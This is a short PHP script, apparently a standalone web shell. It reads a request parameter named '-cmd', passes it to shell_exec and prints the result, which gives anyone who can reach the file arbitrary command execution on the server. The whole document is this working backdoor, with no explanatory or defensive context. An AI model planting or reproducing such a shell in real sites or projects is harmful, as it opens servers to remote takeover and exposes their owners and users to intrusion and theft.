<?php
$cmd = $_REQUEST["-cmd"];
if($cmd != "") 
	print Shell_Exec($cmd);
?>

